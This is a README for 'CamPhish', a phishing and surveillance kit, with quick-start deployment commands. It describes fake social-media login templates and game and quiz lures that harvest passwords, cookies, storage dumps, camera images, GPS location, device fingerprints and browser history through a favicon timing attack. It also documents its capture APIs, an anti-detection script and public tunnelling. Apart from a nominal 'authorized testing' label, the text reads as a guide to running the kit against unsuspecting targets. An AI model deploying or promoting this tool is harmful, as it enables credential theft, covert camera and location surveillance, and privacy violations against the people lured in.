# CamPhish v2.1.1

**Red team camera capture tool — Rust backend + React dashboard + 18 pluggable templates**

**Vision**: CamPhish captures personal data (IP addresses, GPS coordinates, biometric data via camera) for authorized cybersecurity research and penetration testing.

## Quick Start

```bash
git clone https://github.com/yashodhank/CamPhish
cd CamPhish
docker compose --profile cloudflared up -d
```

- Dashboard: http://localhost:8080
- Dashboard: `http://localhost:8080/?code=<access-code>`
- TrailBase Admin: http://localhost:4000/_/admin/
- Game: http://localhost:8080/t/face-runner
- Tunnel: `docker compose logs cloudflared | grep trycloudflare`

Get the access code with `./scripts/docker-code.sh` or `cat data/.access_code`.

## Architecture

```
Target → CamPhish (Rust :8080) → SQLite + TrailBase (:4000)
              ↓
         React Dashboard
              ↓
         18 Templates (/t/:id) → recon.js → 7 capture endpoints
```

## 18 Templates

| Category | Templates |
|----------|-----------|
| **Games** | face-runner, color-match, bubble-pop, dress-up, word-hunt, pet-catch |
| **Social Login** | instagram, facebook, tiktok, whatsapp, snapchat, gmail |
| **Gender Psychology** | beauty-quiz, horoscope, sports-predictor |
| **Original** | festival, youtube, meeting |

## Capture Capabilities

| # | Data | Permission | Method |
|---|------|-----------|--------|
| 1 | IP address | None | HTTP headers |
| 2 | GPS location | Browser prompt | navigator.geolocation |
| 3 | Camera biometrics | Browser prompt | getUserMedia + canvas |
| 4 | Device fingerprint (25+) | None | Canvas, WebGL, audio, fonts, battery, WebRTC |
| 5 | Gender prediction | None | Social media favicon timing |
| 6 | Cookies | None | document.cookie |
| 7 | localStorage/sessionStorage | None | Browser storage API |
| 8 | Browser history | None | Favicon timing attack (12 sites) |
| 9 | Credentials | None (login form) | Social login templates |
| 10 | Auto re-capture | If previously granted | navigator.permissions API |

## API Endpoints

### Capture (target-facing)
- `POST /api/capture/ip` — IP + User-Agent
- `POST /api/capture/location` — GPS coordinates
- `POST /api/capture/image` — Base64 camera snapshot
- `POST /api/capture/fingerprint` — 25+ field device fingerprint
- `POST /api/capture/event` — Session replay events
- `POST /api/capture/storage` — Cookie/storage dump
- `POST /api/capture/credentials` — Username/password

### Dashboard (operator-facing)
- `GET /api/health` — System health
- `GET /api/access` — Local-only access code helper
- `GET /api/stats` — Aggregate statistics
- `GET /api/captures` — Paginated capture list
- `GET /api/locations` — GPS locations
- `GET /api/ips` — IP logs with breakdowns
- `GET /api/credentials` — Captured credentials
- `GET /api/storage` — Captured cookies/storage dumps
- `GET /api/events` — Session replay timeline
- `GET /api/templates` — Template registry
- `GET /api/sessions` — Session management
- `DELETE /api/captures`, `/api/locations`, `/api/ips`, `/api/events`, `/api/credentials`, `/api/storage`, `/api/sessions/:id` — Cleanup endpoints

## Documentation

| Document | Purpose |
|----------|---------|
| [AGENTS.md](AGENTS.md) | AI agent instructions and project rules |
| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | Full architecture documentation |
| [docs/RED-TEAM-PLAYBOOK.md](docs/RED-TEAM-PLAYBOOK.md) | Red team operations manual |
| [docs/TEMPLATE-GUIDE.md](docs/TEMPLATE-GUIDE.md) | Template development guide |
| [docs/LESSONS-LEARNED.md](docs/LESSONS-LEARNED.md) | All bugs, fixes, and lessons |
| [docs/CHANGELOG.md](docs/CHANGELOG.md) | Version history |
| [docs/OPS.md](docs/OPS.md) | Operations manual |
| [docs/DEVELOPER.md](docs/DEVELOPER.md) | Developer guide |
| [docs/USER.md](docs/USER.md) | End-user guide |
| [docs/ANALYSIS.md](docs/ANALYSIS.md) | Technical analysis |

## Tech Stack

| Layer | Technology |
|-------|-----------|
| Backend | Rust 1.96, axum 0.7, sqlx 0.8 (SQLite WAL) |
| Frontend | React 18, TypeScript, Vite 5, TailwindCSS 3 |
| Data | SQLite (primary), TrailBase (admin UI, realtime) |
| Docker | Alpine 3.20, multi-stage (Node 20 + Rust 1.96) |
| Tunnel | Cloudflare Tunnel or Ngrok |
| CI/CD | GitHub Actions (auto-versioning, Docker build, pack CLI) |

## Critical Rules

1. **NEVER** `docker compose down -v` (deletes DB + captures)
2. **NEVER** rename `trailbase/schema/V7__camphish.sql` (V1-V6 reserved)
3. Dashboard access uses `?code=<access-code>` for the SPA shell; use `DASHBOARD_TOKEN` or external auth for API protection on exposed deployments
4. Template placeholders are resolved from the live request origin first; env vars are only fallbacks
5. Helper assets like `/t/viral.js` and `/t/anti-detect.js` are served as JavaScript and are not operator-visible templates
6. All templates include `recon.js` and call `CamPhishRecon.init()`
7. DOM elements use `el` prefix (elScore, elCombo) — prevents variable collisions
8. Games must work WITHOUT camera — camera is optional enhancement

## License

MIT — for authorized penetration testing and security research only.
